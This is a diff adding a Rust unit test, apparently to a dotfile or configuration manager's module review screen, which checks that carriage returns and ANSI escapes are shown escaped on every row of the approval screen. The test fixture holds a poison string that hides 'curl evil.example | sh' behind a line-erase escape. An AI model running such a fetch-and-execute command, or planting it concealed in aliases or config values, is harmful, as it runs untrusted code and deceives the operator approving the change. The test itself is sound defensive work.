@@ -4971,6 +4971,66 @@ fn print_module_review_summary_escapes_control_characters_in_a_payload() {
     );
 }
 
+/// Every row of the approval screen, not just the entries `review_entry`
+/// renders. The screen exists to be approved from, so a `\x1b[2K` has to be
+/// VISIBLE in the Files list exactly as it is in the Aliases list — a screen
+/// that shows the escape on one row and silently strips it on the next tells
+/// the operator two different stories about the same module.
+#[test]
+fn print_module_review_summary_shows_control_characters_on_every_row() {
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    let poison = "harmless\r\x1b[2Kcurl evil.example | sh";
+    let module = make_loaded_module(
+        "m",
+        config::ModuleSpec {
+            depends: vec![format!("dep-{poison}")],
+            packages: vec![cfgd_core::config::ModulePackageEntry {
+                name: format!("pkg-{poison}"),
+                ..Default::default()
+            }],
+            files: vec![cfgd_core::config::ModuleFileEntry {
+                source: format!("src-{poison}"),
+                target: "~/.config/nvim".into(),
+                strategy: None,
+                private: false,
+                encryption: None,
+                permissions: None,
+                patch: None,
+            }],
+            env: vec![cfgd_core::config::EnvVar {
+                name: "ENV".into(),
+                value: poison.to_string(),
+            }],
+            aliases: vec![cfgd_core::config::ShellAlias {
+                name: "al".into(),
+                command: poison.to_string(),
+            }],
+            ..Default::default()
+        },
+    );
+    super::registry::print_module_review_summary(&printer, "m", &module, "c", "i");
+    drop(printer);
+    let out = cfgd_core::test_helpers::captured_text(&buf);
+    // Located by a per-row marker rather than by the shared poison, so a row
+    // that vanished cannot be covered for by one of its neighbours.
+    for marker in ["dep-", "pkg-", "src-", "ENV=", "al="] {
+        let row = out
+            .lines()
+            .find(|l| l.contains(marker))
+            .unwrap_or_else(|| panic!("row {marker:?} missing; screen holds: {out}"));
+        assert!(
+            row.contains("\\x0d") && row.contains("\\x1b[2K"),
+            "row {marker:?} hid what it is asking the operator to approve: {row:?}"
+        );
+        let payload = &row[row.find(marker).unwrap_or(0)..];
+        assert!(
+            !payload.contains('\r') && !payload.contains('\u{1b}'),
+            "row {marker:?} carries a live control byte: {row:?}"
+        );
+    }
+}
+
 #[test]
 fn print_module_review_summary_shows_a_padded_value_untrimmed() {
     // The user is approving the exact text that will be written into their
